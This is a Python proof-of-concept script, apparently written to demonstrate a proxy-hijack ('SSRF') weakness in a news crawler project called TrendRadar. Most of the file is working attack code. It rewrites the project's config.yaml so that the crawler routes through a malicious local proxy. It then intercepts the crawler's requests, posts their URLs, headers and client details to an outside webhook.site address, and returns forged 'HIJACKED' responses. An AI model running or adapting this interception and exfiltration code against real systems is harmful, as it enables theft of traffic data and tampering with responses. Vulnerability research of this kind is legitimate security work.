#!/usr/bin/env python3
"""
ULTIMATE SSRF DEMONSTRATION - Full End-to-End Attack

This demonstrates the COMPLETE attack:
1. Malicious proxy intercepts REAL crawler traffic
2. Proxy forwards to webhook.site
3. You see ACTUAL news API requests at webhook.site

WEBHOOK: https://webhook.site/a78b922a-7974-4346-bba9-bc7caae13d93

This is the REAL attack, not simulation.
"""

import json
import time
import requests
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from pathlib import Path
import yaml
import shutil

WEBHOOK_URL = "https://webhook.site/a78b922a-7974-4346-bba9-bc7caae13d93"

class RealTrafficInterceptor(BaseHTTPRequestHandler):
    """
    Intercepts REAL crawler traffic and sends to webhook.site
    """

    request_counter = 0

    def log_message(self, format, *args):
        """Suppress default logging"""
        pass

    def do_GET(self):
        """Intercept actual GET requests from crawler"""
        RealTrafficInterceptor.request_counter += 1
        count = RealTrafficInterceptor.request_counter

        print("\n" + "="*70)
        print(f"[!!!] INTERCEPTED REAL CRAWLER REQUEST #{count}")
        print("="*70)
        print(f"🎯 URL: {self.path}")
        print(f"📡 Client: {self.client_address[0]}:{self.client_address[1]}")
        print(f"🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        print()

        # Extract all headers
        headers_dict = {}
        for header, value in self.headers.items():
            headers_dict[header] = value
            print(f"   {header}: {value}")

        # Check if this is the external API request
        is_api_request = "newsnow.busiyi.world" in self.path or "api/s" in self.path

        if is_api_request:
            print("\n[!!!] CRITICAL: This is the REAL news API request!")
            print("[!!!] Platform ID and parameters exposed!")

            # Parse the URL to extract platform
            if "id=" in self.path:
                platform_id = self.path.split("id=")[1].split("&")[0]
                print(f"[!!!] Platform being queried: {platform_id}")

        # Prepare exfiltration data
        exfil_data = {
            "alert": "🚨 REAL TRAFFIC INTERCEPTED 🚨",
            "request_number": count,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "attack_type": "LIVE SSRF - Real Crawler Traffic",
            "intercepted_request": {
                "method": "GET",
                "full_url": self.path,
                "headers": headers_dict,
                "client_ip": self.client_address[0],
                "client_port": self.client_address[1]
            },
            "analysis": {
                "is_external_api": is_api_request,
                "target_host": "newsnow.busiyi.world" if is_api_request else "unknown",
                "platform_id": self.path.split("id=")[1].split("&")[0] if is_api_request and "id=" in self.path else "N/A"
            },
            "impact": "Attacker now knows: request URLs, headers, timing, platform IDs",
            "next_steps": "Attacker can: log credentials, modify responses, DoS by dropping requests"
        }

        # Exfiltrate to webhook.site
        print("\n📤 Exfiltrating to webhook.site...")
        try:
            resp = requests.post(
                WEBHOOK_URL,
                json=exfil_data,
                headers={"Content-Type": "application/json"},
                timeout=5
            )
            if resp.status_code == 200:
                print("✅ EXFILTRATION SUCCESS!")
                print(f"✅ Check webhook.site to see this intercepted request!")
            else:
                print(f"⚠️  Webhook response: {resp.status_code}")
        except Exception as e:
            print(f"❌ Exfiltration error: {e}")

        print("\n" + "="*70)

        # For demo purposes, return fake data instead of proxying to real API
        # This prevents actually hitting the external API during demo
        if is_api_request:
            fake_response = {
                "status": "success",
                "message": "⚠️ This response was intercepted and modified by attacker's proxy",
                "items": [
                    {
                        "title": f"[HIJACKED] Request #{count} intercepted at {time.strftime('%H:%M:%S')}",
                        "url": WEBHOOK_URL
                    }
                ]
            }

            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(fake_response).encode())
        else:
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'OK')

    def do_CONNECT(self):
        """Handle HTTPS CONNECT"""
        print(f"\n[!] HTTPS CONNECT to: {self.path}")

        exfil_data = {
            "alert": "HTTPS Connection Attempt",
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "target": self.path,
            "note": "HTTPS requires SSL MITM - connection logged but not fully intercepted"
        }

        try:
            requests.post(WEBHOOK_URL, json=exfil_data, timeout=5)
        except:
            pass

        self.send_response(200)
        self.end_headers()


def setup_malicious_config(proxy_port=8888):
    """Set up malicious config.yaml"""
    config_path = Path("config/config.yaml")
    backup_path = Path("config/config.yaml.backup_real_attack")

    # Backup original
    if config_path.exists() and not backup_path.exists():
        shutil.copy(config_path, backup_path)
        print(f"✅ Backed up config to: {backup_path}")

    # Read and modify config
    with open(config_path) as f:
        config = yaml.safe_load(f)

    # Set malicious proxy
    config['crawler']['use_proxy'] = True
    config['crawler']['default_proxy'] = f"http://127.0.0.1:{proxy_port}"
    config['crawler']['enable_crawler'] = True

    # Limit to one platform for clean demo
    config['platforms'] = [
        {"id": "zhihu", "name": "知乎"}
    ]

    # Write back
    with open(config_path, 'w') as f:
        yaml.dump(config, f, default_flow_style=False, allow_unicode=True)

    return str(backup_path)


def run_attack_demo():
    """Run the complete attack demonstration"""
    print("="*70)
    print(" 🔴 ULTIMATE SSRF ATTACK - REAL TRAFFIC INTERCEPTION 🔴")
    print("="*70)
    print()
    print("This demonstrates the COMPLETE attack chain:")
    print("  1. Malicious proxy server starts (port 8888)")
    print("  2. config.yaml modified to use malicious proxy")
    print("  3. Real crawler runs and makes API requests")
    print("  4. Proxy intercepts ACTUAL traffic")
    print("  5. Data exfiltrated to webhook.site")
    print()
    print(f"🎯 Exfiltration target: {WEBHOOK_URL}")
    print()
    print("="*70)
    print()

    # Step 1: Configure malicious config
    print("[STEP 1] Setting up malicious configuration...")
    backup_path = setup_malicious_config(proxy_port=8888)
    print(f"✅ Config modified: proxy = http://127.0.0.1:8888")
    print(f"✅ Backup saved: {backup_path}")
    print()

    # Step 2: Start proxy
    print("[STEP 2] Starting malicious proxy server on port 8888...")
    print()
    print("🔴 ATTACK STATUS: ACTIVE")
    print("🔴 All crawler traffic will be intercepted")
    print("🔴 Data will be exfiltrated to webhook.site")
    print()
    print("="*70)
    print()

    print("📋 NEXT STEPS:")
    print()
    print("In another terminal, run the crawler:")
    print()
    print("  Option 1 - Direct crawler:")
    print("    cd /home/user/TrendRadar")
    print("    python3 main.py")
    print()
    print("  Option 2 - MCP trigger:")
    print("    # Start MCP server")
    print("    python3 mcp_server/server.py --transport http")
    print("    # Call trigger_crawl tool")
    print()
    print("Then watch:")
    print("  • This terminal → See intercepted requests")
    print("  • webhook.site → See exfiltrated data")
    print()
    print(f"🔗 Webhook URL: {WEBHOOK_URL}")
    print()
    print("="*70)
    print()
    print("🎬 Malicious proxy is now listening...")
    print("⏳ Waiting for crawler traffic...")
    print()

    try:
        server = HTTPServer(('0.0.0.0', 8888), RealTrafficInterceptor)
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n\n[*] Attack stopped by user")
        print(f"\n[*] To restore config: mv {backup_path} config/config.yaml")
    except Exception as e:
        print(f"\n[!] Error: {e}")
        print(f"[*] To restore config: mv {backup_path} config/config.yaml")


def quick_test():
    """Quick test to verify webhook.site is reachable"""
    print("🧪 Testing webhook.site connectivity...")

    test_data = {
        "test": "Connection test",
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "message": "If you see this, the malicious proxy can exfiltrate data"
    }

    try:
        resp = requests.post(WEBHOOK_URL, json=test_data, timeout=5)
        if resp.status_code == 200:
            print("✅ webhook.site is reachable!")
            print(f"✅ Ready to intercept and exfiltrate traffic")
            return True
        else:
            print(f"⚠️  Unexpected response: {resp.status_code}")
            return False
    except Exception as e:
        print(f"❌ Cannot reach webhook.site: {e}")
        return False


if __name__ == "__main__":
    print()

    # Quick connectivity test
    if quick_test():
        print()
        input("Press ENTER to start the malicious proxy attack...")
        run_attack_demo()
    else:
        print("\n⚠️  Cannot reach webhook.site. Check network connection.")
